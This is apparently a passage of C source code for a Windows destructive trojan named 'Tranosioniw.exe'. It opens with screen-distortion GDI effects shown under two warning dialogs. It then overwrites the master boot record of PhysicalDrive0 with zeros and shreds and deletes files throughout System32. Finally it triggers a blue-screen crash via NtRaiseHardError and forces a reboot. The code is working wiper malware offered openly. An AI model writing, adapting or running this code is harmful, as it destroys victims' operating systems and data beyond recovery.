{
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            HDC hdcCopy = CreateCompatibleDC(hdc);

            INT nBlockSize = rand() % 129 + 128;
            INT nNewBlockSize = nBlockSize + (rand() % 17 + 16);

            INT x = rand() % (w - nBlockSize);
            INT y = rand() % (h - nBlockSize);

            StretchBlt(hdc, x - (nNewBlockSize - nBlockSize) / 2, y - (nNewBlockSize - nBlockSize) / 2, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, !(rand() % 2) ? SRCAND : SRCPAINT);
            StretchBlt(hdcCopy, x - (nNewBlockSize - nBlockSize) / 2, y - (nNewBlockSize - nBlockSize) / 2, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, WHITENESS);
            BLENDFUNCTION blend = { 0, 0, 50, 0 };
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI shader5or2(LPVOID lpThread)
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(1000);
    }
}

DWORD WINAPI shader6(LPVOID lpThread)
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader6or1(LPVOID lpParam) {
    HDC hdc;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), xSize = sw / 4, ySize = 8;
    while (1) {
        hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < sw + 10; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
            BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCERASE);
        }
        BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCERASE);
        Sleep(1);
        ReleaseDC(0, hdc);
        DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
    }
}

DWORD WINAPI shaderfinalz(LPVOID lpParam) {
    const int width = GetSystemMetrics(0), height = GetSystemMetrics(1);

    HWND laywin = CreateWindowExA(
        WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT | WS_EX_TOPMOST,
        "STATIC", "gdi distortion", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL
    );

    POINT winpos = { 0, 0 };
    SIZE winsize = { width, height };

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = height;
    bmi.bmiHeader.biPlanes = 1;

    RGBQUAD* pixels;
    RGBQUAD* pixels_copy = (RGBQUAD*)malloc(width * height * sizeof(RGBQUAD));
    RGBQUAD* src = (RGBQUAD*)VirtualAlloc(0, width * height * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    HDC hdc = GetDC(0);
    HDC memdc = CreateCompatibleDC(hdc);
    HBITMAP hbit = CreateDIBSection(hdc, &bmi, 0, (void**)&pixels, 0, 0);
    SelectObject(memdc, hbit);

    int t = 0;
    int col = 0;
    int y0 = 0;
    int x0 = 0;
    int time = 0;
    int xc = width / 2;
    int yc = height / 2;
    int angle = 0;
    while (true)
    {
        BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
        memcpy(pixels_copy, pixels, width * height * 4);
        (DWORD*)col;

        for (int y = 0; y < height; y++)
        {
            for (int x = 0; x < width; x++)
            {
                int desty = yc + (x - xc) * sin(angle * (PI / 150)) + (y - yc) * cos(angle * (PI / 150));
                int destX = xc + (x - xc) * cos(angle * (PI / 150)) - (y - yc) * sin(angle * (PI / 150));
                int sx = x + (int)destX;
                destX += width;
                destX %= width;
                desty += height;
                desty %= height;
                pixels[y * width + x] = pixels_copy[desty * width + destX];
            }
        }

        angle++;

        UpdateLayeredWindow(laywin, hdc, &winpos, &winsize, memdc, &winpos, 0, NULL, ULW_OPAQUE);
        SetWindowPos(laywin, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOMOVE);
    }

    ReleaseDC(0, hdc);
    DeleteDC(memdc);
    DeleteObject(hbit);
    DestroyWindow(laywin);
    free(pixels_copy);
}


const unsigned char MBR[512]{};

DWORD WINAPI MBT(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MBR, 512, &Bytes, NULL);
    return 1;
}

static BOOL FileExists(const wchar_t* wszPath) {
    WIN32_FILE_ATTRIBUTE_DATA fad;
    return GetFileAttributesExW(wszPath, GetFileExInfoStandard, &fad);
}

static BOOL CombinePath(wchar_t* wszOut, size_t nSize,
    const wchar_t* wszLeft,
    const wchar_t* wszRight) {
    if (!wszOut || !wszLeft || !wszRight) return FALSE;
    wcscpy_s(wszOut, nSize, wszLeft);
    size_t len = wcslen(wszOut);
    if (len > 0 && wszOut[len - 1] != L'\\') {
        wszOut[len] = L'\\';
        wszOut[len + 1] = L'\0';
    }
    wcscat_s(wszOut, nSize, wszRight);
    return TRUE;
}


static DWORD CALLBACK KillFile(wchar_t* wszPath) {
    if (!wszPath || !FileExists(wszPath)) return ERROR_FILE_NOT_FOUND;

    HANDLE hFile = CreateFileW(
        wszPath,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();

    HCRYPTPROV hProv = 0;
    BYTE rgb[4096];
    DWORD cbWritten = 0;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CloseHandle(hFile); return GetLastError();
    }

    if (!CryptGenRandom(hProv, sizeof(rgb), rgb)) {
        CryptReleaseContext(hProv, 0);
        CloseHandle(hFile);
        return GetLastError();
    }

    CryptReleaseContext(hProv, 0);

    WriteFile(hFile, rgb, sizeof(rgb), &cbWritten, NULL);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);

    MoveFileExW(wszPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    CloseHandle(hFile);
    return ERROR_SUCCESS;
}


DWORD WINAPI CorruptSystem32(LPVOID lpThread) {
    UNREFERENCED_PARAMETER(lpThread);

    wchar_t wszSystem32[MAX_PATH];
    GetSystemDirectoryW(wszSystem32, MAX_PATH);

    wchar_t wszTarget[MAX_PATH];
    CombinePath(wszTarget, MAX_PATH, wszSystem32, L"..\\System32");

    WIN32_FIND_DATAW ffd;
    wchar_t wszSearch[MAX_PATH];
    CombinePath(wszSearch, MAX_PATH, wszTarget, L"*");

    HANDLE hFind = FindFirstFileW(wszSearch, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return GetLastError();

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(ffd.cFileName, L".") && wcscmp(ffd.cFileName, L"..")) {
                wchar_t wszSub[MAX_PATH];
                CombinePath(wszSub, MAX_PATH, wszTarget, ffd.cFileName);

                wchar_t wszSubSearch[MAX_PATH];
                CombinePath(wszSubSearch, MAX_PATH, wszSub, L"*");

                HANDLE hSub = FindFirstFileW(wszSubSearch, &ffd);
                if (hSub != INVALID_HANDLE_VALUE) {
                    do {
                        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                            wchar_t wszFile[MAX_PATH];
                            CombinePath(wszFile, MAX_PATH, wszSub, ffd.cFileName);
                            KillFile(wszFile);
                        }
                    } while (FindNextFileW(hSub, &ffd));
                    FindClose(hSub);
                }
            }
        }
        else {
            wchar_t wszFile[MAX_PATH];
            CombinePath(wszFile, MAX_PATH, wszTarget, ffd.cFileName);
            KillFile(wszFile);
        }
    } while (FindNextFileW(hFind, &ffd));

    FindClose(hFind);
    return ERROR_SUCCESS;
}

__declspec(dllexport)
DWORD WINAPI CorruptS32(LPVOID lpParameter) {
    return CorruptS32(lpParameter);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (MessageBoxW(0, L"you ran a trojan called Tranosioniw.exe Trojan.\n\r\nif you're running this program into clicking yes,\nthen you need to keep in mind your computer is going to be destroyed.\nor if you dont know what this does if your running this in a safe enviroment press 'Yes' to start it.\nthis is also a forbidden software.\nbut, if you click 'no' your computer will be safe.\n\r\nare you sure you really want to execute this malware?", L"Tranosioniw.exe - ALPHATH", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    if (MessageBoxW(0, L"this is the final warning.\n\r\nthe creator will be not responsible for any data loss or damages to your computer.\nit can cause your computer to corrupt system32.\nare you still sure you want to execute this malware?\nthis is your final chance to remove this trojan at 1% chance.", L"Tranosioniw.exe - ​̻ fin..//???.al​̸ ​͎w​͓a​͍r​͓.n​.i​n​͈g​̻ ", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    CreateThread(0, 0, MBT, 0, 0, 0);
    Sleep(3000);
    HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
    HANDLE thread1or1 = CreateThread(0, 0, shader1or1, 0, 0, 0);
    CreateThread(0, 0, windowfff, 0, 0, 0);
    CreateThread(0, 0, payloadspam, 0, 0, 0);
    sound1(8000, 50);
    InvalidateRect(0, 0, 0);
    Sleep(100);
    TerminateThread(thread1, 0);
    TerminateThread(thread1or1, 0);
    HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
    HANDLE thread2or1 = CreateThread(0, 0, shader2or1, 0, 0, 0);
    sound2(8000, 50);
    InvalidateRect(0, 0, 0);
    Sleep(100);
    TerminateThread(thread2, 0);
    TerminateThread(thread2or1, 0);
    HANDLE thread3or2 = CreateThread(0, 0, shader3or2, 0, 0, 0);
    HANDLE thread2Cube = CreateThread(0, 0, shader2Cube, 0, 0, 0);
    sound3(8000, 50);
    InvalidateRect(0, 0, 0);
    Sleep(100);
    TerminateThread(thread3or2, 0);
    TerminateThread(thread2Cube, 0);
    HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
    HANDLE thread4or1 = CreateThread(0, 0, shader4or1, 0, 0, 0);
    sound4(8000, 50);
    Sleep(100);
    TerminateThread(thread4, 0);
    TerminateThread(thread4or1, 0);
    HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
    HANDLE thread5or1 = CreateThread(0, 0, shader5or1, 0, 0, 0);
    HANDLE thread5or2 = CreateThread(0, 0, shader5or2, 0, 0, 0);
    sound5(8000, 50);
    Sleep(100);
    TerminateThread(thread5, 0);
    TerminateThread(thread5or1, 0);
    TerminateThread(thread5or2, 0);
    HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
    HANDLE thread6or1 = CreateThread(0, 0, shader6or1, 0, 0, 0);
    sound6(8000, 50);
    Sleep(100);
    TerminateThread(thread6, 0);
    TerminateThread(thread6or1, 0);
    CreateThread(0, 0, CorruptSystem32, 0, 0, 0);
    CreateThread(0, 0, shader5, 0, 0, 0);
    CreateThread(0, 0, shader4, 0, 0, 0);
    CreateThread(0, 0, shader4or1, 0, 0, 0);
    CreateThread(0, 0, shader6, 0, 0, 0);
    CreateThread(0, 0, shader1, 0, 0, 0);
    CreateThread(0, 0, shader1or1, 0, 0, 0);
    CreateThread(0, 0, shaderfinalz, 0, 0, 0);
    sound7(8000, 50);
    Sleep(100);
    BOOLEAN bl;
    DWORD response;
    NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege(19, 1, 0, &bl);
    ULONG_PTR args[] = { (ULONG_PTR)"that your PC is now fucked by The Tranosioniw.exe Trojan" };
    NtRaiseHardError(0xC0000144, 1, 0, (PULONG)args, 6, &response);
    HANDLE token;
    TOKEN_PRIVILEGES privileges;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
    Sleep(-1);
}